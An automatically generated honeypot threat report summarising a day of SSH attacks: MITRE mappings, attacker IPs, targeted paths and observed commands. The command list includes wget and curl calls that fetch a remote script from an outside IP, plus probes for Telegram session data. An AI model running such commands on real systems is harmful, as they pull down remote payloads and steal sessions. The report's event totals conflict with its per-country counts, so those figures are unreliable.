# Threat Intelligence Report

**Generated**: 2026-04-20 21:49 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **574 events** from **560 unique source IPs** across **33 countries** and **53 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 574 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 560 |
| Atomic Attack Patterns | 579 |
| MITRE ATT&CK Techniques | 6 |
| Generated Sigma Rules | 4 |
| Generated YARA Rules | 3 |
| Generated Suricata Rules | 4 |
| Blocked IPs (Firewall) | 502 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1082 (System Information Discovery) | | 567 |
| T1059.004 (Unix Shell) | | 2 |
| T1105 (Ingress Tool Transfer) | | 2 |
| T1005 (Data from Local System) | | 2 |
| T1057 (Process Discovery) | | 1 |
| T1016 (System Network Configuration Discovery) | | 1 |

### Tactics Distribution

- **discovery**: 569 events ████████████████████████████████████████
- **execution**: 2 events █
- **command_and_control**: 2 events █
- **collection**: 2 events █

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 21,092 |
| France | 7,017 |
| Mexico | 6,510 |
| Germany | 2,514 |
| Poland | 1,941 |
| Netherlands | 1,005 |
| Bulgaria | 992 |
| Russia | 705 |
| United Kingdom | 677 |
| China | 537 |
| Singapore | 479 |
| South Korea | 455 |
| Pakistan | 368 |
| Hong Kong | 363 |
| Seychelles | 296 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| ReliableSite.Net LLC | 15,716 |
| Sierra Madre Internet SA de CV | 6,293 |
| OVH SAS | 4,150 |
| Modat B.V. | 2,427 |
| ISAEV Igor | 1,899 |
| Hydra Communications Ltd | 1,442 |
| Tube-Hosting | 1,262 |
| Amazon.com, Inc. | 1,253 |
| ColocaTel Inc. | 930 |
| ONYPHE SAS | 857 |
| Censys, Inc. | 777 |
| Google LLC | 774 |
| Alibaba US Technology Co., Ltd. | 774 |
| UCLOUD INFORMATION TECHNOLOGY HK LIMITED | 682 |
| DigitalOcean, LLC | 650 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `177.125.137.18` | 6,293 | Attacker |
| `104.243.32.235` | 4,492 | Attacker |
| `51.68.207.118` | 4,147 | Attacker |
| `104.243.43.7` | 2,387 | Attacker |
| `87.251.64.159` | 1,886 | Attacker |
| `185.150.191.165` | 1,802 | Attacker |
| `104.243.35.94` | 1,794 | Attacker |
| `185.91.127.85` | 1,260 | Attacker |
| `104.243.34.165` | 945 | Attacker |
| `104.243.35.120` | 936 | Attacker |
| `206.221.176.60` | 913 | Attacker |
| `85.11.167.11` | 913 | Attacker |
| `104.243.35.104` | 904 | Attacker |
| `104.243.43.19` | 889 | Attacker |
| `104.243.35.92` | 584 | Attacker |
| `176.120.22.6` | 497 | Attacker |
| `85.217.140.11` | 434 | Attacker |
| `220.92.117.221` | 428 | Attacker |
| `152.42.238.0` | 288 | Attacker |
| `85.217.140.37` | 272 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 560 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 5 |

### Targeted File Paths

- `/.local/share/TelegramDesktop/tdata`
- `/etc/smsd.conf`
- `/var/log/smsd.log`
- `/var/qmux_connect`
- `/var/spool/sms`

### Extracted URLs

- `https://46.151.182.82/sh`

---

## Top Attack Patterns (SSH)

- [433x] `uname -a`
- [130x] `/bin/./uname -s -v -n -r -m`
- [3x] `uname -s -m`
- [2x] `grep '[Mm]iner`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://46.151.182.82/sh`
- [1x] `curl -sk https://46.151.182.82/sh`
- [1x] `sh -s ssh`
- [1x] `cat /proc/cpuinfo`
- [1x] `ps -ef`
- [1x] `ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* `
- [1x] `locate D877F783D5D3EF8Cs`
- [1x] `echo Hi`
- [1x] `cat -n`
- [1x] `ifconfig`

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 4 | `sigma/*.yml` |
| YARA (Payload) | 3 | `yara/*.yar` |
| Suricata (IDS/IPS) | 4 | `suricata/honeypot.rules` |
| Firewall (iptables) | 502 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*